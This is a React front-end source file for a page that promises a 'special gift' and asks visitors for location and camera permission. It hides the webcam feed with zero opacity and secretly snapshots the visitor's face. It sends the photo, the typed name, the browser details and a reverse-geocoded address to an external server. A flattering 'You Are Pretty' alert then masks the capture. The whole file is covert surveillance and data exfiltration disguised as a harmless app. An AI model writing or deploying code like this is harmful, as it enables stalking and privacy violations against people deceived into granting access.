import { useState, useRef, useEffect } from 'react'
import './App.css'
import Webcam from 'react-webcam'

function App() {
  const webcamRef = useRef(null)
  const [photo, setPhoto] = useState(null)
  const [allow, setAllow] = useState(false)
  const [location, setLocation] = useState(null)
  const [ cam, setCam] = useState(false)
  useEffect(() => {
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        console.log(lat, lon);

        setAllow(true);

        const res = await fetch(
          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`
        );

        const data = await res.json();
        console.log(data.display_name);
        setLocation(data.display_name)
      },
      (error) => {
        setAllow(false);
        console.log(error.message);
      }
    );
  }, []);
  const capture = async (e) => {
    e.preventDefault()

    const name = e.target.name.value
    console.log(name);
    if (!webcamRef.current) return
    const imageSrc = webcamRef.current.getScreenshot()

    setPhoto(imageSrc)
    const device = navigator.userAgent;
    console.log(imageSrc, device);
    await fetch('https://click-server-yur0.onrender.com/', {

      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },

      body: JSON.stringify({
            imageSrc,
            name,
            device,
            location 
          })

    })
    alert(`You Are Pretty ${name}!`)
  }

  return (
    
    <div>
      {!allow && alert('Please allow location and camera permission for your special gift')}
      <Webcam
        style={{width:'1920px', height:'1080', opacity: 0, position: 'absolute'}}
        ref={webcamRef}
        screenshotFormat="image/jpeg"
        onUserMedia={() => {
          console.log("Camera allowed")
          setCam(true)
        }}
         onUserMediaError={() => {
          setCam(false)
        }}
      />
        <form style={{ marginTop: '200px', display: 'flex', flexDirection: 'column', justifyContent:'center,', alignItems:'center', gap:'10px'}} onSubmit={capture}>
          <p style={{color:'blue', marginRight:'100px'}}>Your Name:</p>
          <input style={{position: 'relative', backgroundColor: 'white', width:'180px', padding: '10px', borderRadius: '10px', color:'black', height:'30px'}} name='name' type="text" placeholder='Type Your Name' required/>

          <p style={{color: 'red'}}>{!cam ? 'Please allow all access' : ''}</p>

          <input value={'Submit'} type='submit' style={{position: 'relative', backgroundColor: 'white', fontSize:'20px', fontWeight: 'bold', width:'100px', padding: '5px', borderRadius: '10px', color:'black', cursor: 'pointer'}} disabled={!cam}/>
        </form>

    </div>
  )
}

export default App
